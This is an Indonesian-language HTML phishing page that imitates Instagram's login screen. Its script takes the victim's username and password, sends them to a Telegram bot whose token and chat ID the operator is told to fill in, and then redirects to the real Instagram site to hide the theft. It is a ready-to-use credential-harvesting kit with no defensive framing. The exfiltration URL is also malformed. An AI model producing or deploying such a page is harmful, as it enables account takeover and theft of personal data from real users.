<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram Style</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            /* Efek gradasi warna resmi logo Instagram */
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            margin: 0; 
        }
        .login-box { 
            background: white; 
            padding: 40px; 
            border-radius: 4px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.2); 
            width: 350px; 
            box-sizing: border-box;
        }
        h2 { 
            text-align: center; 
            margin-bottom: 30px; 
            color: #262626; 
            font-family: 'Arial Black', sans-serif;
            font-style: italic;
            font-size: 32px;
            letter-spacing: -1px;
        }
        .input-group { margin-bottom: 10px; }
        .input-group input { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #dbdbdb; 
            border-radius: 4px; 
            box-sizing: border-box; 
            background-color: #fafafa;
            font-size: 12px;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        button { 
            width: 100%; 
            padding: 12px; 
            background-color: #4cb5f9; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-size: 14px; 
            font-weight: bold;
            cursor: pointer; 
            margin-top: 15px;
        }
        button:hover { background-color: #0095f6; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Instagram</h2>
    <form id="telegramForm">
        <div class="input-group">
            <input type="text" id="username" required placeholder="Nomor telepon, nama pengguna, atau email">
        </div>
        <div class="input-group">
            <input type="password" id="password" required placeholder="Kata sandi">
        </div>
        <button type="submit">Masuk</button>
    </form>
</div>

<script>
document.getElementById('telegramForm').addEventListener('submit', function(e) {
    e.preventDefault(); 

    const usernameInput = document.getElementById('username').value;
    const passwordInput = document.getElementById('password').value;

    // Kredensial Telegram (GANTI DENGAN DATA MILIK ANDA)
    const botToken = "TOKEN_BOT_ANDA";
    const chatId = "CHAT_ID_ANDA";

    const pesan = `=== DATA LOGIN INSTAGRAM ===\nUsername: ${usernameInput}\nPassword: ${passwordInput}`;

    fetch(`https://telegram.org{botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: pesan
        })
    })
    .then(response => {
        if(response.ok) {
            // GANTI DENGAN URL WEBSITE TARGET ANDA
            window.location.href = "https://instagram.com"; 
        } else {
            alert('Gagal mengirim data. Periksa konfigurasi API Bot.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Terjadi kesalahan jaringan.');
    });
});
</script>

</body>
</html>
